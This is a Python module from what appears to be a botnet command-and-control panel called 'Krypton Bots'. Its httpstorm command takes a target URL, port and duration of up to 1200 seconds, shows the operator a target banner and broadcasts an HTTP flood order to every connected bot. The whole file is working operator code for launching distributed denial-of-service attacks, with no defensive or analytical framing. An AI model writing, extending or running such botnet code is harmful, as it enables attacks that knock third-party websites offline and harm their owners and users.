import time
from colorama import Fore

def httpstorm(args, validate_time, send, client, ansi_clear, broadcast, data):
    if len(args) == 4:
        url = args[1]
        port = args[2]
        secs = args[3]

        xxxx = '''%s============= (%sTARGET%s) ==============
            %s URL:%s %s
            %sPORT:%s %s
            %sTIME:%s %s
          %sMETHOD:%s %s'''%(Fore.LIGHTWHITE_EX, Fore.GREEN, Fore.LIGHTWHITE_EX, Fore.CYAN, Fore.YELLOW, url, Fore.CYAN, Fore.YELLOW, port, Fore.CYAN, Fore.YELLOW, secs,Fore.CYAN, Fore.YELLOW, 'HTTP STORM')

        if validate_time(secs):
            for x in xxxx.split('\n'):
                send(client, '\x1b[3;31m'+ x)
            send(client, f" {Fore.LIGHTWHITE_EX}\nAttack {Fore.LIGHTGREEN_EX}successfully{Fore.LIGHTWHITE_EX} sent to all Krypton Bots!\n")
            broadcast(data)
        else:
            send(client, Fore.RED + '\nInvalid attack duration (1-1200 seconds)\n')
    else:
        send(client, f'\nUsage: {Fore.YELLOW}.httpstorm [URL] [PORT] [TIME]\n')
